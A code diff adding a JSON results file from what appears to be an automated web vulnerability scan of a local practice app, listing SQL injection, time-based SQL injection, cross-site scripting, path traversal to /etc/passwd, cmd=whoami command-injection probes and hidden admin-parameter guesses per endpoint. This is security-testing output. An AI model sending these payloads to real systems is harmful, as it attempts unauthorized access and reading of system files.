+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/user",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/rest/user?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/user",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/rest/user?file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/user",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/rest/user?cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "reflected",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/user",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/rest/user?search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/admin",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/rest/admin?q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/admin",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/rest/admin?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/admin",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/rest/admin?file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/admin",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/rest/admin?cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "reflected",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/admin",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/rest/admin?search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/user/login",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/rest/user/login?q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/user/login",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/rest/user/login?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/user/login",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/rest/user/login?file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/user/login",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/rest/user/login?cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "reflected",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/user/login",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/rest/user/login?search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "AI_XSS",
+        "endpoint": "http://localhost:3001/api",
+        "param": "id",
+        "payload": "%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E",
+        "confidence_score": 100,
+        "severity": "HIGH"
+    },
+    {
+        "type": "AI_XSS",
+        "endpoint": "http://localhost:3001/rest/user/reset-password",
+        "param": "item",
+        "payload": "%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E",
+        "confidence_score": 100,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api",
+        "param": "admin",
+        "payload": "1",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api",
+        "param": "admin",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api",
+        "param": "admin",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api",
+        "param": "isAdmin",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api",
+        "param": "isAdmin",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api",
+        "param": "isAdmin",
+        "payload": "1",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api",
+        "param": "role",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api",
+        "param": "role",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api",
+        "param": "debug",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api",
+        "param": "debug",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api",
+        "param": "access",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api",
+        "param": "privilege",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api",
+        "param": "privilege",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api",
+        "param": "auth",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api",
+        "param": "token",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/memories",
+        "param": "admin",
+        "payload": "1",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/memories",
+        "param": "admin",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/memories",
+        "param": "admin",
+        "payload": "yes",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/memories",
+        "param": "isAdmin",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/memories",
+        "param": "isAdmin",
+        "payload": "yes",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/memories",
+        "param": "isAdmin",
+        "payload": "1",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/memories",
+        "param": "role",
+        "payload": "yes",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/memories",
+        "param": "role",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/memories",
+        "param": "role",
+        "payload": "1",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/memories",
+        "param": "debug",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/memories",
+        "param": "debug",
+        "payload": "yes",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/memories",
+        "param": "debug",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/memories",
+        "param": "access",
+        "payload": "yes",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/memories",
+        "param": "access",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/memories",
+        "param": "access",
+        "payload": "1",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/memories",
+        "param": "privilege",
+        "payload": "1",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/memories",
+        "param": "privilege",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/memories",
+        "param": "privilege",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/memories",
+        "param": "auth",
+        "payload": "yes",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/memories",
+        "param": "auth",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/memories",
+        "param": "auth",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/memories",
+        "param": "token",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/memories",
+        "param": "token",
+        "payload": "yes",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/memories",
+        "param": "token",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/api?q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/api?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/api?file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/api?cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "reflected",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/api?search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/2fa/status",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/rest/2fa/status?q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/2fa/status",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/rest/2fa/status?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/2fa/status",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/rest/2fa/status?file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/2fa/status",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/rest/2fa/status?cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/2fa/status",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/rest/2fa/status?search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Deliverys",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/api/Deliverys?q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Deliverys",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/api/Deliverys?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Deliverys",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/api/Deliverys?file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Deliverys",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/api/Deliverys?cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Deliverys",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/api/Deliverys?search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/memories",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/rest/memories?q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/memories",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/rest/memories?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/memories",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/rest/memories?file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/memories",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/rest/memories?cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/memories",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/rest/memories?search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/user/reset-password",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/rest/user/reset-password?q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/user/reset-password",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/rest/user/reset-password?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/user/reset-password",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/rest/user/reset-password?file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/user/reset-password",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/rest/user/reset-password?cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/user/reset-password",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/rest/user/reset-password?search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Challenges/?key=nftMintChallenge",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/api/Challenges/?key=nftMintChallenge&q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Challenges/?key=nftMintChallenge",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/api/Challenges/?key=nftMintChallenge&q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Challenges/?key=nftMintChallenge",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/api/Challenges/?key=nftMintChallenge&file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Challenges/?key=nftMintChallenge",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/api/Challenges/?key=nftMintChallenge&cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Challenges/?key=nftMintChallenge",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/api/Challenges/?key=nftMintChallenge&search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/wallet/balance",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/rest/wallet/balance?q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/wallet/balance",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/rest/wallet/balance?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/wallet/balance",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/rest/wallet/balance?file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/wallet/balance",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/rest/wallet/balance?cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/wallet/balance",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/rest/wallet/balance?search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/login",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/login?q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/login",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/login?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/login",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/login?file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/login",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/login?cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/login",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/login?search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    }
+]
